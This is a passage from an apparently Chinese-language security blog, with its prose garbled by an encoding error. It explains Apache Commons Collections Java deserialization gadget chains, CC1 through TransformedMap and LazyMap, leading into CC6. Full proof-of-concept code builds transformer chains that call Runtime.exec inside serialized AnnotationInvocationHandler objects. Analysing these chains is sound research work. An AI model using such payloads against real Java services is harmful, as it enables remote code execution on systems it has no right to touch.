class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>Map&lt;Object, Object&gt; evilMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>evilMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-number">114514</span>);<br></code></pre></td></tr></table></figure><p>å¯¹äºé—®é¢˜äºŒï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå®Œç¾å®Œæˆä»»åŠ¡çš„ç±»ï¼š<strong>AnnotationInvocationHandler</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// sun.reflect.annotation.AnnotationInvocationHandler#readObject</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> &#123;<br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        annotationType = AnnotationType.getInstance(type);<br>    &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>        <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>    &#125;<br><br>    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>    <span class="hljs-comment">// If there are annotation members without values, that</span><br>    <span class="hljs-comment">// situation is handled by the invoke method.</span><br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>        Class&lt;?&gt; memberType = memberTypes.get(name);<br>        <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>            <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                  value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                memberValue.setValue(<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                        value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                        annotationType.members().get(name)));<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®¡ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">memberValue.setValue =ã€‹<br>TransformedMap#checkSetValue =ã€‹ <br>valueTransformer.transform()<br></code></pre></td></tr></table></figure><p>checkSetValueä¼šå› ä¸ºMapè°ƒç”¨setValueæ–¹æ³•è€Œè°ƒç”¨checkSetValueæ–¹æ³•ï¼›</p><p>å› æ­¤è®©<code>memberValue</code>ä¸ºä¸Šé¢çš„evilMapå³å¯ã€‚</p><p>ä½†æ€ä¹ˆè§¦å‘åˆ°è¿™ä¸ªsetValueå‘¢ï¼Ÿ</p><p>åˆ¤æ–­æ¡ä»¶åœ¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; memberType = memberTypes.get(name);<br></code></pre></td></tr></table></figure><p>å®ƒéœ€è¦æ»¡è¶³<code>memberType != null</code>æ‰èƒ½è¿›å…¥<code>memberValue.setValue</code></p><p>ç»§ç»­è·Ÿè¿›ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br></code></pre></td></tr></table></figure><p>å†åˆ°annotationTypeï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">annotationType = AnnotationType.getInstance(type);<br></code></pre></td></tr></table></figure><p>æ„é€ å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues)<br></code></pre></td></tr></table></figure><p>typeæ˜¯æ„é€ å¯¹è±¡æ—¶ä¼ è¿›æ¥çš„<code>Annotationå­ç±»</code>çš„<code>Class</code> </p><p>nameæ˜¯ä¼ å…¥Mapï¼ˆmemberValuesï¼‰çš„æ¯ä¸ªé”®å</p><p><code>memberType.get(name)</code>è¦ä¸ä¸ºç©º  å³è¦æ±‚<code>AnnotationType</code>è¦æœ‰åä¸º<code>name</code>çš„æˆå‘˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(AnnotationType.getInstance(Target.class).memberTypes());<br><span class="hljs-comment">// &#123;value=class [Ljava.lang.annotation.ElementType;&#125;</span><br>System.out.println(AnnotationType.getInstance(Retention.class).memberTypes());<br><span class="hljs-comment">// &#123;value=class java.lang.annotation.RetentionPolicy&#125;</span><br></code></pre></td></tr></table></figure><p>@Retentionå’Œ@Targetéƒ½æœ‰<code>value</code>è¿™ä¸ªæˆå‘˜</p><p>å¦å¤–ï¼Œ<code>AnnotationInvocationHandler</code>çš„æ„é€ æ–¹æ³•è¢«defaultä¿®é¥°ï¼Œä¸èƒ½ç›´æ¥newï¼Œè¦åˆ©ç”¨åå°„æ¥å®ä¾‹åŒ–è¯¥ç±»ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¾—åˆ°äº†<strong>CC1-TransformedMap-POC</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-number">114514</span>);<br>Map&lt;Object, Object&gt; evilMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>cons.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">aih</span> <span class="hljs-operator">=</span> cons.newInstance(Target.class, evilMap);<br><br><span class="hljs-comment">// åºåˆ—åŒ–</span><br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>oos.writeObject(aih);<br>oos.close();<br><br><span class="hljs-comment">// ååºåˆ—åŒ–</span><br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>ois.close();<br></code></pre></td></tr></table></figure><p>ä½†è¿™ä¸ªCC1é—®é¢˜å¾ˆå¤šï¼Œé¦–å…ˆæ˜¯<code>sun.reflect.annotation.AnnotationInvocationHandler</code>ä½œä¸ºCC1é“¾çš„å…¥å£ç±»ï¼Œ åœ¨<strong>Jdk8u71</strong>ä¹‹åè¢«ä¿®æ”¹äº†ï¼Œä¿®æ”¹åçš„<code>readObject</code>æ–¹æ³•ä¸­æ–°å»ºäº†ä¸€ä¸ª<code>LinkedHashMap</code>å¯¹è±¡ï¼Œå¹¶å°†åŸæ¥çš„é”®å€¼æ·»åŠ è¿›å»ã€‚</p><p>æ‰€ä»¥ï¼Œåç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªæ–°çš„<code>LinkedHashMap</code>å¯¹è±¡ï¼Œè€ŒåŸæ¥æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„Mapä¸å†æ‰§è¡ŒsetValueæˆ–putæ“ä½œï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘RCEäº†ã€‚</p><p>æ¥ä¸‹æ¥å°±è¦å¼•å…¥<strong>CC1-LazyMap</strong>çš„æ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯ysoserialä¸­çš„æ–¹æ³•ã€‚</p><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>åˆ†æå®Œä¸Šé¢çš„é“¾å­å…¶å®å°±å¾ˆæ˜¾ç„¶ï¼ŒCCé“¾çš„å…³é”®åœ¨äº<code>transform()</code>çš„è§¦å‘,ä¸Šé¢é‚£æ¡<code>TransformedMap</code>çš„è§¦å‘åœ¨äºâ€œå¤–æ´â€<code>AnnotationInvocationHandler</code>çš„<code>readObject</code>è°ƒç”¨äº†<code>setValue</code>ï¼Œè¿›è€Œè§¦å‘<code>TransformedMap</code>çš„<code>checkSetValue</code>ï¼Œè¿›è€Œè§¦å‘<code>transform()</code></p><p>è€Œ<code>LazyMap</code>æ˜¯å¦ä¸€ä¸ªè§¦å‘ç‚¹å¤‡é€‰ï¼Œå› ä¸º<code>LazyMap</code>çš„<code>get</code>æ–¹æ³•ä¸­ä¼šæ‰§è¡Œ<code>factory.transform()</code>ï¼Œä¹Ÿæš—åˆâ€œæ‡’åŠ è½½â€çš„çœŸè°›ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMap</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">LazyMap</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">this</span>.factory = factory;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>        <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>            map.put(key, value);<br>            <span class="hljs-keyword">return</span> value;<br>        &#125;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>LazyMap</code>ç”±getè§¦å‘ï¼Œå¯¹æ¯”ä¸€ä¸‹å¯ä»¥å‘ç°ï¼š</p><ul><li>LazyMapï¼šgetå…ƒç´ æ—¶è§¦å‘</li><li>TransformedMapï¼šsetå…ƒç´ æ—¶è§¦å‘</li></ul><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><p>å…ˆç»™å‡ºGadget Chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>AnnotationInvocationHandler#readObject()<br>Map(Proxy)#entrySet()<br>AnnotationInvocationHandler#invoke()<br>LazyMap#get()<br>        <span class="hljs-comment">//æ¶æ„å¯¹è±¡åå°„é“¾éƒ¨åˆ†</span><br>ChainedTransformer#transform()<br>ConstantTransformer#transform()<br>                        InvokerTransformer#transform()<br>                        Method#invoke()<br>                        Class#getMethod()<br>                        InvokerTransformer#transform()<br>                        Method#invoke()<br>                        Runtime#getRuntime()<br>                        InvokerTransformer#transform()<br>                        Method#invoke()<br>                        Runtime#exec()<br></code></pre></td></tr></table></figure><p>ä¸å‰é¢åˆ†æçš„<code>TransformedMap</code>ä¸åŒï¼Œåœ¨<code>sun.reflect.annotation.AnnotationInvocationHandler</code>çš„<code>readObject</code>æ–¹æ³•ä¸­å¹¶æ²¡æœ‰ç›´æ¥è°ƒç”¨åˆ°Mapçš„getæ–¹æ³•ã€‚</p><p>ä½†æ˜¯ysoserialæ‰¾åˆ°äº†<code>AnnotationInvocationHandler</code>çš„invokeæ–¹æ³•ä¸­è°ƒç”¨äº†getï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>    <span class="hljs-comment">// Handle Object and Annotation methods</span><br>    <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>        paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>        <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>    <span class="hljs-keyword">switch</span>(member) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>            <span class="hljs-keyword">return</span> toStringImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>            <span class="hljs-keyword">return</span> hashCodeImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>            <span class="hljs-keyword">return</span> type;<br>    &#125;<br><br>    <span class="hljs-comment">// Handle annotation member accessors</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br>    <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>å®é™…æ˜¯ä¸ªä»£ç†ç±»ï¼Œå®ƒå®ç°äº†<code>InvocationHandler</code>æ¥å£ã€‚</p><p>æˆ‘ä»¬åªéœ€è¦å®Œæˆï¼š</p><ol><li><code>readObject</code>ä¸­è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œè°ƒç”¨è€…æ˜¯<code>AnnotationInvocationHandler</code>ä»£ç†å¯¹è±¡</li><li><code>AnnotationInvocationHandler</code>çš„<code>invoke</code>è§¦å‘<code>memberValues.get()</code> ï¼Œå› æ­¤ä»£ç†å¯¹è±¡çš„<code>memberValues</code>è¦è®¾ä¸º<code>LazyMap</code></li><li><code>LazyMap#get</code>è§¦å‘<code>factory.transform()</code></li></ol><p>é‚£ä¹ˆPOCä¹Ÿå°±å‘¼ä¹‹æ¬²å‡ºäº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>            <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>            <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>            <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">argMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">evilMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(argMap, chainedTransformer);<br><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler)constructor.newInstance(Retention.class, evilMap);<br>    <span class="hljs-comment">// ä»£ç†å¯¹è±¡proxyMap</span><br>    <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br><br>    handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);<br><br><br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>    oos.writeObject(handler);<br>    oos.close();<br><br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><p>POCä¸­è§¦å‘<code>invoke</code>çš„æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler#readObject =&gt; memberValues.entrySet()<br></code></pre></td></tr></table></figure><p>å› æ­¤<code>Proxy.newProxyInstance</code>ä¼ çš„æ˜¯<code>Map</code>çš„<code>ClassLoader</code>å’Œæ¥å£</p><p>ä½†æ˜¯ï¼Œ<code>LazyMap</code>çš„æ¼æ´è§¦å‘åœ¨getå’Œinvokeä¸­ è€Œ<code>TransformedMap</code>çš„æ¼æ´è§¦å‘åœ¨setValueä¸­ </p><p>åŒæ ·åœ¨ <strong>Jdk8u71</strong>ä¹‹åï¼Œç”±äº<code>AnnotationInvocationHandler</code>ä¸å†ç›´æ¥ä½¿ç”¨ååºåˆ—åŒ–å¾—åˆ°çš„Mapå¯¹è±¡ï¼Œè€Œæ˜¯æ–°å»ºäº†ä¸€ä¸ª<code>LinkedHashMap</code>å¯¹è±¡ï¼Œåç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªæ–°çš„<code>LinkedHashMap</code>å¯¹è±¡ã€‚ å› æ­¤CC1é“¾åªå±€é™åœ¨<strong>Jdk8u71</strong>ä¹‹å‰çš„ç‰ˆæœ¬ã€‚æ‰€ä»¥è¿™é‡Œå¼¹ä¸å‡ºcalcï¼Œä½†æ˜¯åŸç†æ˜¯è¿™ä¹ˆä¸ªåŸç†ã€‚</p><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>ä¸ºä»€ä¹ˆä¸æŒ‰é¡ºåºæ¥ï¼Œç¡®å®å› ä¸ºCC2çš„ç‰¹ç‚¹è·Ÿå‰é¢CC1æ¥ä¸ä¸Šï¼Œä½†æ˜¯CC6å¯ä»¥é¡ºå»¶å¾€ä¸‹è®²ï¼Œä¸Šé¢è¯´åˆ°<strong>Jdk8u71</strong>å¼•å…¥çš„<code>LinkedHashMap</code>è®©CC1å¤±æ•ˆï¼Œè€ŒCC6å…‹æœäº†è¿™ä¸€ç‚¹ï¼Œè„±èƒäºCC1ï¼Œæˆä¸ºJava8ç³»åˆ—å¸¸è§çš„åŸç”Ÿé“¾ã€‚</p><p>CC6é“¾å­ååŠæ®µè¿˜æ˜¯ä½¿ç”¨CC1çš„<code>LazyMap</code>ï¼Œç”±äº<code>AnnotationInvocationHandler</code>å› Javaç‰ˆæœ¬è€Œåˆ©ç”¨å—é™ï¼Œéœ€è¦æ‰¾å¯»å…¶ä»–å¯ä»¥è°ƒç”¨<code>LazyMap#get</code>çš„åœ°æ–¹ã€‚</p><p>è¿™é‡Œåˆè¦å¼•å…¥ä¸€ä¸ªå®Œç¾è§£å†³è¿™ä¸ªé—®é¢˜çš„ç±»äº†ï¼Œæ¥ä¸‹æ¥èµ¶åˆ°æˆ˜åœºçš„æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.apache.commons.collections.keyvalue.TiedMapEntry<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 